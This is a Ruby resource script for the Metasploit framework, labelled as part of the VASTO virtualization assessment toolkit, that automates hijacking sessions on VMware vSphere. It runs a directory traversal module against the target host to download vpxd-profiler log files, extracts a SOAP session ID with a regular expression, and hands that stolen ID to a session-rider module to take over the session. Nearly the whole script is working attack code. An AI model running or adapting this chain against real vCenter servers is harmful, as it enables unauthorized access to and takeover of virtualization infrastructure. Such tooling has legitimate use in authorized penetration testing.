#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################

# Automated Session Hijacker
# This resource script automatizes retrieving remote sessions from a VMware vSphere system combining
# updatemanager traversal and session rider 

#This is a temporary resource file, the autopwner module should do the trick in the future.
#In order to have this module working, just configure the RHOST parameter


<ruby>
  OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE
  #Checking up to id = 100
  maxfiles = framework.datastore['MAXLOGFILES'] || 100  

  #Fetching temporary directory to parse the file since we have no output
  require 'tmpdir'
  tpath = Dir.tmpdir + "/"
  #Setting tempdir so that we can check for file download since the exploit does not return any value
  framework.datastore['LOCALDIR'] = tpath 
  print_status("Will test up to 100 files, set MAXLOGFILES to override")
  print_status("Retrieving log files...")
  for i in 1..maxfiles do
      begin
	#C:\ProgramData\VMware\VMware VirtualCenter\Logs for Windows 2008
	#This has to be configured according to your language and OS
	#framework.datastore['FILE'] = 'Documents and Settings\All Users\Dati applicazioni\VMware\VMware VirtualCenter\Logs/vpxd-profiler-'+"#{i}"+'.log'
	framework.datastore['FILE'] = 'ProgramData\VMware\VMware VirtualCenter\Logs\vpxd-profiler-'+"#{i}"+'.log'
	print_status("Testing #{framework.datastore['FILE']}")
	exploit = framework.modules.create("auxiliary/vasto/vmware_updatemanager_traversal")
	exploit.run_host(framework.datastore['RHOST'])
	print_status("Got it!!! vpxd-profiler-#{i}.log")
	@target = i
	break
	#print_status(SessionRetrieved)
      rescue  Errno::ECONNREFUSED,::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::OpenURI::HTTPError
      rescue ::Timeout::Error, ::Errno::EPIPE
      end
  end

  #We now parse the file we retrieved to extract the latest available session
   lfile = tpath << "vpxd-profiler-#{i}.log"
   lfile = Dir.tmpdir + "/" +  framework.datastore['FILE']
   readfile = File.new(lfile, "r")   
   
   #SISTAMRE QUESTA REGEXP!
   regex = Regexp.new(/Session\/.*SoapSession\/Id='(.*)'/)
   while (line = readfile.gets)
	matchdata = regex.match(line)
	if matchdata 
	  @STOLENSOAPID = matchdata[1]
	  print_status("Found SOAPID : #{@STOLENSOAPID}")
	end
   end
    readfile.close
    #And now, we go for a ride :-) Activating session rider 
    framework.datastore['SOAPID'] = @STOLENSOAPID
    print_status("Activating session rider with soapod #{@STOLENSOAPID}")
    rider = framework.modules.create("auxiliary/vasto/vmware_session_rider")
    rider.run
     
</ruby>